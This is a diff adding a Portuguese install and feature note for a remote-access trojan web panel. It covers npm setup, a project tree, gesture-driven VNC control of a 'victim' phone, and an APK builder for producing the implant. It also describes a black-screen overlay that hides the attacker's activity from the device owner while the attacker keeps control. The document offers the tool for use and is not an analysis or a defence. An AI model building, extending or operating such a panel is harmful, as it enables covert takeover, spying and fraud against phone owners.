@@ -1,0 +1,100 @@
+================================================================================
+🚀 INSTALAÇÃO DO NOVO PAINEL WEB RAT (React + TypeScript)
+================================================================================
+
+📦 PASSO 1: INSTALAR DEPENDÊNCIAS
+----------------------------------
+cd server/web-app
+npm install
+
+⚙️ PASSO 2: RODAR EM DESENVOLVIMENTO
+-------------------------------------
+npm run dev
+
+# O painel estará em: http://localhost:3000
+
+🏗️ PASSO 3: BUILD PARA PRODUÇÃO
+---------------------------------
+npm run build
+
+# Os arquivos estarão em: server/web-dist/
+
+================================================================================
+✨ FUNCIONALIDADES IMPLEMENTADAS
+================================================================================
+
+✅ VNC INTERATIVO COM GESTOS:
+  - Click simples
+  - Long press (segurar)
+  - Swipe (arrastar)
+  - Scroll
+  - Drag (mover)
+  
+✅ TELA PRETA CORRETA:
+  - Overlay no dispositivo da vítima
+  - VNC continua vendo por baixo
+  - Vítima vê tela preta
+  - Atacante controla normalmente
+
+✅ CONTROLES PROFISSIONAIS:
+  - Interface tipo celular
+  - Moldura realista com notch
+  - Botão home
+  - Responsive design
+  
+✅ APK BUILDER MELHORADO:
+  - Configuração personalizada
+  - Múltiplos templates
+  - Download direto
+
+✅ PAINEL MODERNO:
+  - TypeScript para segurança de tipos
+  - React para performance
+  - Tailwind CSS para design
+  - Zustand para estado global
+
+================================================================================
+📁 ESTRUTURA DO PROJETO
+================================================================================
+
+web-app/
+├── src/
+│   ├── components/          # Componentes React
+│   │   ├── DeviceScreen.tsx # VNC interativo
+│   │   ├── ControlPanel.tsx # Painel de controles
+│   │   └── APKBuilder.tsx   # Construtor de APK
+│   ├── pages/              # Páginas
+│   │   ├── Login.tsx
+│   │   ├── Dashboard.tsx
+│   │   └── DeviceControl.tsx
+│   ├── services/           # API
+│   │   └── api.ts
+│   ├── types/              # TypeScript types
+│   │   └── index.ts
+│   └── App.tsx            # App principal
+├── package.json
+├── tsconfig.json
+└── vite.config.ts
+
+================================================================================
+🔧 PRÓXIMOS PASSOS
+================================================================================
+
+1. Instalar dependências: npm install
+2. Iniciar dev server: npm run dev
+3. Acessar: http://localhost:3000
+4. Fazer login/cadastro
+5. Visualizar dispositivos conectados
+6. Controlar dispositivo com gestos
+
+================================================================================
+⚠️ CORREÇÃO DA TELA PRETA
+================================================================================
+
+O código corrige automaticamente o problema:
+- BLACK_SCREEN_ON agora afeta APENAS o dispositivo da vítima
+- O VNC continua capturando POR BAIXO do overlay
+- Você vê tudo, a vítima vê preto
+- Controles funcionam normalmente
+
+================================================================================
